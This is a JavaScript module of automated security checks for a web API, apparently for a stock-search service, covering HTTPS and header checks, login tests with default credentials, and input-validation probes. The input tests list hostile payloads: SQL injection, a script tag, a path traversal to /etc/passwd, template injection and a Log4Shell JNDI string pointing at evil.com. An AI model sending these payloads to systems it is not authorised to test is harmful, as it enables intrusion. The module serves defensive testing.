const getAxios = require("./http-client");

const securityMethods = {
  async runSecurityTests() {
    console.log("  🔍 执行安全漏洞扫描...");
    const vulnerabilityResults = await this.runVulnerabilityScan();
    this.testResults.security.vulnerabilities = vulnerabilityResults;

    console.log("  🔐 执行认证授权测试...");
    const authResults = await this.runAuthenticationTests();
    this.testResults.security.authentication = authResults;

    console.log("  🛡️ 执行输入验证测试...");
    const inputValidationResults = await this.runInputValidationTests();
    this.testResults.security.inputValidation = inputValidationResults;
  },

  async runVulnerabilityScan() {
    const axios = getAxios();
    try {
      // 使用OWASP ZAP Baseline扫描（如果可用）
      // 这里简化为基本安全检查
      const securityChecks = [
        { name: "HTTPS检查", url: this.config.baseUrl, expectedProtocol: "https" },
        { name: "安全头检查", url: this.config.baseUrl, checkHeaders: true },
      ];

      const results = [];
      for (const check of securityChecks) {
        try {
          const response = await axios.get(check.url, { timeout: 5000 });
          const result = { name: check.name, status: "passed", details: {} };

          if (check.expectedProtocol && !this.config.baseUrl.startsWith("https")) {
            result.status = "warning";
            result.details.protocol = "HTTP (建议使用HTTPS)";
          }

          if (check.checkHeaders) {
            const headers = response.headers;
            const securityHeaders = ["x-content-type-options", "x-frame-options", "x-xss-protection"];

            result.details.headers = {};
            securityHeaders.forEach(header => {
              result.details.headers[header] = headers[header] || "missing";
            });
          }

          results.push(result);
        } catch (error) {
          results.push({
            name: check.name,
            status: "failed",
            error: error.message,
          });
        }
      }

      return results;
    } catch (error) {
      return { error: error.message };
    }
  },

  async runAuthenticationTests() {
    const axios = getAxios();
    const authTests = [
      { name: "登录功能", url: "/api/auth/login", method: "POST", data: { username: "admin", password: "admin123" } },
      { name: "无效密码", url: "/api/auth/login", method: "POST", data: { username: "admin", password: "wrong" } },
      { name: "会话检查", url: "/api/user/profile", method: "GET", requireAuth: true },
    ];

    const results = [];
    for (const test of authTests) {
      try {
        const config = {
          method: test.method,
          url: `${this.config.apiUrl}${test.url}`,
          timeout: 5000,
          validateStatus: () => true,
        };

        if (test.data) {
          config.data = test.data;
          config.headers = { "Content-Type": "application/json" };
        }

        const response = await axios(config);

        let status = "passed";
        if (test.name === "登录功能") {
          status = response.status === 200 ? "passed" : "failed";
        } else if (test.name === "无效密码") {
          status = response.status === 401 ? "passed" : "failed";
        } else if (test.name === "会话检查") {
          status = response.status === 401 ? "passed" : response.status === 200 ? "passed" : "failed";
        }

        results.push({
          name: test.name,
          status,
          httpStatus: response.status,
          responseTime: Date.now() - config.metadata?.startTime || 0,
        });
      } catch (error) {
        results.push({
          name: test.name,
          status: "failed",
          error: error.message,
        });
      }
    }

    return results;
  },

  async runInputValidationTests() {
    const axios = getAxios();
    const maliciousInputs = ["' OR '1'='1", "<script>alert('xss')</script>", "../../../etc/passwd", "{{7*7}}", "${jndi:ldap://evil.com/a}"];

    const results = [];
    for (const input of maliciousInputs) {
      try {
        const response = await axios.get(`${this.config.apiUrl}/api/stock/search?q=${encodeURIComponent(input)}`, {
          timeout: 5000,
          validateStatus: () => true,
        });

        const safe = !response.data || (typeof response.data === "string" && !response.data.includes(input));
        results.push({
          input,
          safe,
          status: response.status,
          detectedPattern: safe ? "未检测到恶意输入" : "可能存在注入风险",
        });
      } catch (error) {
        results.push({
          input,
          safe: true, // 错误比被注入要好
          error: error.message,
        });
      }
    }

    return results;
  },
};

module.exports = securityMethods;
